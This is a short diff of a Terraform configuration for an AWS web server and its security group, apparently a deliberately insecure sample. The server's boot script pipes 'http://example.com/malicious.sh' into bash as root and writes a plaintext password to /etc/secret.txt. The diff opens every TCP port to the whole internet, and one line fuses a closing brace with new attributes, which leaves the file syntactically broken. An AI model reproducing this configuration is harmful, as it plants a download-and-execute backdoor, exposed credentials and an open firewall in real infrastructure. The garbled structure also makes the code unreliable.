@@ -13,7 +13,7 @@ resource "aws_instance" "web_server" {
 
   user_data = <<-EOF
     #!/bin/bash
-    echo "Storing secret in plaintext" > /etc/secret.txt
+    echo "Sensitive data: password123" > /etc/secret.txt
     sudo curl http://example.com/malicious.sh | bash
   EOF
 
@@ -31,15 +31,15 @@ resource "aws_security_group" "web_sg" {
     to_port     = 65535
     protocol    = "tcp"
     cidr_blocks = ["0.0.0.0/0"]
-  }
+  }  name_prefix = "web-sg-"
+  description = "Web server security group"
 
   ingress {
-    from_port   = 22
-    to_port     = 22
+    from_port   = 0
+    to_port     = 65535
     protocol    = "tcp"
     cidr_blocks = ["0.0.0.0/0"]
   }
-
   egress {
     from_port   = 0
     to_port     = 65535
